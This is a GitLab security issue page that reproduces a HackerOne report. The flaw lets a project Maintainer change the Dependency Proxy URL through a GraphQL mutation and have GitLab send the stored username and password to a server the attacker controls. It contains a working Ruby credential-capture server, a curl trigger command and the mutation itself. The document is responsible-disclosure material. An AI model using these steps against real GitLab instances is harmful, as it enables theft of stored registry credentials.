=== Content from gitlab.com_bda685a6_20250111_002359.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Maintainer can leak Dependency Proxy password by changing Dependency Proxy URL via POST /api/graphql `updateDependencyProxyPackagesSettings` operation

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2466205](https://hackerone.com/reports/2466205)** by `ac7n0w` on 2024-04-17, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

I've discovered a vulnerability similar to the one reported in [GitLab issue #385118](https://gitlab.com/gitlab-org/gitlab/-/issues/385118 "Maintainer can leak masked webhook secrets by changing target URL of the webhook"), which can lead to the leakage of authentication information for the Dependency Proxy. Although restrictions have been implemented to prevent the password field of the Dependency Proxy from being exposed, I found a method to circumvent this check. An attacker can modify the URL of the Dependency Proxy and then trigger a `dependency_proxy` request to send the username and password to the attacker's server.

This vulnerability was verified on the v16.10.2-ee version. You must install version 16.10.2-ee (not the CE version) and have a license to enable Ultimate features. If you do not have a license, you can obtain one by following the instructions in the [hackerone-triage-team-gitlab-licenses](https://handbook.gitlab.com/handbook/security/product-security/application-security/runbooks/hackerone-process/#hackerone-triage-team-gitlab-licenses).

##### Steps to reproduce

1. Install GitLab on the server `<host>` and create a project using the root account `root/<repo_name>`.
2. Navigate to `root/<repo_name>` -> [Settings] -> [Packages and Registries], and locate the Dependency Proxy settings at the bottom of the page.
3. Enable [Enable Dependency Proxy] and fill in the URL, Username, and Password.

[![set.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/3ccd41c1998f1f97c7523209e759b2175afafb63/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353365666365312d666262622d346637642d386261652d3533656363666262646563662f7365742e706e67)

4. Run the following Ruby script to start an HTTP server to receive the password:

```
require 'webrick'
require 'base64'

server = WEBrick::HTTPServer.new(:Port => 9000)
server.mount_proc '/' do |req, res|
  if req.header.key?("authorization") && !req.header["authorization"].empty?
    auth_header = req.header["authorization"].to_s
    encoded_credentials = auth_header.sub('Basic ', '')
    decoded_credentials = Base64.decode64(encoded_credentials)
    puts "Username:Password: #{decoded_credentials}"
  else
    puts "Authorization header is empty or not present"
  end
end

trap 'INT' do
  server.shutdown
end
server.start
```

5. As I do not have access to a cloud server, I set up this HTTP server locally. To allow GitLab to access this server, I have previously allowed 'Allow requests to the local network' in [Admin Area] -> [Settings] -> [Outbound requests].

[![out.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/de5723baea963bf058470fda4846f1875832336a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63326537393039632d333762652d346134312d383039392d6236646264643635303337312f6f75742e706e67)

6. Create an attacker account `attacher` and invite it as a `Maintainer` to become a member of `root/<repo_name>`.
7. Set up a Burp proxy, log in as `attacher`, navigate to the Dependency Proxy settings page like `root`, modify the URL to our pre-configured address (do not enter a password). Upon clicking save, an error is displayed on the page.

[![error.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/ab6dccb1f967f37014ec3d41c7ec09b5513442c1/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31646533613466352d643437302d343438362d386230352d3062303737306264356535352f6572726f722e706e67)

8. Find this request in the Burp's HTTP History.

[![http-history.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/84842f74c027029eb6b29852934c67922a43b8c4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33623663373739342d346533352d343638342d383237382d3331386264396230643664382f687474702d686973746f72792e706e67)

9. Send this request to the [Repeater], remove the `mavenExternalRegistryPassword` field, and resend the request. It is found that the setting can be successful.

[![repeater.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d456522e5f12854878346eaf7b3918ff74df1908/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32363532343865312d363032342d343362652d396339662d3938663734363231316536322f72657065617465722e706e67)

10. Replace `<username>`, `<personal access token>`, `<host>`, and `<project_id>` in the command below and execute it. You will find that the root user's password is printed out on the ruby server.

```
curl "https://<username>:<personal access token>@<host>/api/v4/projects/<project_id>/dependency_proxy/packages/maven/com/my_company/my_package/1.2.3/my_package-1.2.3.pom"
```

[![print.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/38b229284446f4510629389a0b0d2d60db2c5fb5/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35656161343331632d643830362d346635322d383664612d3233363639613061633534302f7072696e742e706e67)

#### Impact

1. Maintainers can leak Dependency Proxy authentication credentials that should not be accessible after configuration.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [set.png](https://h1.sec.gitlab.net/a/a53efce1-fbbb-4f7d-8bae-53eccfbbdecf/set.png)
* [repeater.png](https://h1.sec.gitlab.net/a/265248e1-6024-43be-9c9f-98f746211e62/repeater.png)
* [print.png](https://h1.sec.gitlab.net/a/5eaa431c-d806-4f52-86da-23669a0ac540/print.png)
* [out.png](https://h1.sec.gitlab.net/a/c2e7909c-37be-4a41-8099-b6dbdd650371/out.png)
* [http-history.png](https://h1.sec.gitlab.net/a/3b6c7794-4e35-4684-8278-318bd9b0d6d8/http-history.png)
* [error.png](https://h1.sec.gitlab.net/a/1de3a4f5-d470-4486-8b05-0b0770bd5e55/error.png)

## How To Reproduce

From [#458484 (comment 1978587424)](https://gitlab.com/gitlab-org/gitlab/-/issues/458484#note_1978587424 "Maintainer can leak Dependency Proxy password by changing Dependency Proxy URL via POST /api/graphql `updateDependencyProxyPackagesSettings` operation")

Here are the simplified reproduction steps as we don't need a proxy at all:

1. Setup the dependency proxy settings with any url + a username and password.
2. Using `/-/graphql-explorer`, execute:

   ```
   mutation {
     updateDependencyProxyPackagesSettings (input: { projectPath: "<project path>", mavenExternalRegistryUrl: "<new url>"}) {
       dependencyProxyPackagesSetting {
         mavenExternalRegistryUrl
         mavenExternalRegistryUsername
       }
       errors
     }
   }
   ```
3. `<new url>` should be a backend that reads and dumps the basic auth configuration.
4. access `api/v4/projects/<project_id>/dependency_proxy/packages/maven/foo/1/a` and watch the backend on `<new url>` dumping the username and password of (1.).

Edited Aug 28, 2024 by [Radamanthus Batnag](/radbatnag)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


